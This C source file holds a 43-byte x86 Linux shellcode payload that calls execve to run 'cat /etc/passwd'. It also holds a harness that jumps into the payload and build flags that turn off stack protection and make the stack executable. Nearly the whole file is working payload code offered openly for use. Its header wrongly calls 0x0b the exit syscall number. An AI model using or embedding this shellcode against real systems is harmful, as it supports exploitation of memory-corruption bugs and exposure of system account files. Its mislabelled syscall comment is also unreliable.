/*
the shellcode for executing read the "/etc/passwd" written by Ben Chang from WHU
function equal with the code:
	#include<stdio.h>
	int main()
	{
		char *a[]={"/bin/cat","/etc/passwd"};
		execve(a[0],a,NULL);
	}
size = 43 bytes
the syscall number of exit:0x0b
Tips:You can test the shellcode on your system(Linux) as follows:
$gcc -fno-stack-protector -z execstack shellcode_cat_etc_passwd_43bytes.c -o cat_passwd
$./cat_passwd

int execve(const char * filename,char * const argv[ ],char * const envp[ ]);
arg1:the address of filename strings eg:/bin/cat
arg2:the address of arguments input to the binary to be executed, for this example *argv[]={"/bin/cat","/etc/passwd"}
arg3:the address of environment arguments,usually assign to "NULL"
arg1->ebx,arg2->ecx,arg3->edx 
syscall number:0x0b->eax(al)
*/
#include<stdio.h>
#include<string.h>
char shellcode[]=
    "\x33\xC0"               //xor     eax, eax
    "\x99"                   //cdq
	"\x52"                   //push    edx
	"\x68\x73\x73\x77\x64"   //push    64777373
	"\x68\x2F\x2F\x70\x61"   //push    61702F2F
	"\x68\x2F\x65\x74\x63"   //push    6374652F
	"\x8B\xCC"               //mov     ecx, esp
	"\x52"                   //push    edx
	"\x68\x2F\x63\x61\x74"   //push    7461632F
	"\x68\x2F\x62\x69\x6E"   //push    6E69622F
	"\x8B\xDC"               //mov     ebx, esp
	"\x52"                   //push    edx
	"\x51"                   //push    ecx
	"\x53"                   //push    ebx
	"\x8B\xCC"               //mov     ecx, esp
	"\xB0\x0B"               //mov     al, 0B
	"\xCD\x80";              //int     80
int main()
{
    void (*testshellcode)() = (void*)&shellcode;
    printf("size of the shellcode:%dbytes\n",strlen(shellcode));
    testshellcode();
}